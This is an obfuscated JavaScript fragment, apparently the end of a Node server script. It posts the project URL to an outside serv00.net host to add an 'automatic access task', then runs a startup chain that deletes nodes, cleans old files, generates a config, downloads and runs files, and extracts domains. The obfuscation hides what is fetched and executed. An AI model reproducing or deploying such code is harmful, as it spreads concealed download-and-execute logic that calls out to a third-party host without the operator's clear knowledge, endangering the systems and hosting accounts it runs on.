axios['post']('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0xa2e132(0xdd)}});return console[_0xa2e132(0x13f)]('automatic\x20access\x20task\x20added\x20successfully'),_0x2767b6;}catch(_0x21ab20){return console[_0xa2e132(0x12c)](_0xa2e132(0xff)+_0x21ab20[_0xa2e132(0x13e)]),null;}}async function startserver(){const _0x2e2fc3=_0x4232b7;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x40ffb1){console[_0x2e2fc3(0x12c)](_0x2e2fc3(0x142),_0x40ffb1);}}startserver()[_0x4232b7(0xcd)](_0x2ad79f=>{const _0x12264a=_0x4232b7;console[_0x12264a(0x12c)]('Unhandled\x20error\x20in\x20startserver:',_0x2ad79f);}),app[_0x4232b7(0xea)](PORT,()=>console[_0x4232b7(0x13f)](_0x4232b7(0x124)+PORT+'!'));
